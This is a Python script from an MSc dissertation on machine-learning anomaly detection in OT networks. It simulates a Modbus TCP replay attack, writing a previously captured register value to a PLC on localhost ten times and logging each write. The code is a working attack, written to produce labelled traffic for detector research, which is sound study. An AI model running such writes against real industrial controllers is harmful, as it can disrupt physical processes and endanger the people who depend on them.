#!/usr/bin/env python3
"""
MSc Cybersecurity Dissertation
Evaluating Machine Learning Approaches for Anomaly Detection in OT Network Traffic
Dewanshi Manoj Agarkar

------------------------------------------------------------------------------
Replay Attack - Modbus TCP
Resends a previously captured LEGITIMATE write command to the PLC,
replaying it outside its original context. Simulates an attacker who
sniffed genuine traffic and later re-injects it unmodified.

Modbus TCP has no built-in replay protection (no sequence numbers,
nonces, or timestamps in the PDU), so a captured legitimate write is
indistinguishable from a fresh legitimate write once resent.
"""

from pymodbus.client import ModbusTcpClient
import time
import csv
from datetime import datetime

PLC_IP = "127.0.0.1"
PLC_PORT = 502

# Captured from modbus_capture.pcap (normal baseline traffic)
# frame_time_relative=144.31s, func_code=6, reference_num=0, value=900
REPLAY_REGISTER = 0
REPLAY_VALUE = 900
NUM_REPLAYS = 10
REPLAY_INTERVAL_SEC = 5

LOG_FILE = "replay_attack_log.csv"

def main():
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    if not client.connect():
        print(f"Failed to connect to PLC at {PLC_IP}:{PLC_PORT}")
        return

    print(f"Connected to PLC. Replaying captured write "
          f"(register={REPLAY_REGISTER}, value={REPLAY_VALUE}) "
          f"{NUM_REPLAYS} times at {REPLAY_INTERVAL_SEC}s intervals...")

    with open(LOG_FILE, mode="w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["replay_num", "timestamp", "register", "value", "latency_ms", "success"])

        for i in range(1, NUM_REPLAYS + 1):
            start = time.perf_counter()
            result = client.write_register(REPLAY_REGISTER, REPLAY_VALUE)
            latency_ms = (time.perf_counter() - start) * 1000
            success = not result.isError()
            ts = datetime.now().isoformat()

            writer.writerow([i, ts, REPLAY_REGISTER, REPLAY_VALUE, f"{latency_ms:.3f}", success])
            print(f"[{i}/{NUM_REPLAYS}] {ts} - wrote {REPLAY_VALUE} to register {REPLAY_REGISTER} "
                  f"({'OK' if success else 'FAILED'}, {latency_ms:.2f} ms)")

            time.sleep(REPLAY_INTERVAL_SEC)

    client.close()
    print(f"Replay attack complete. Log saved to {LOG_FILE}")

if __name__ == "__main__":
    main()
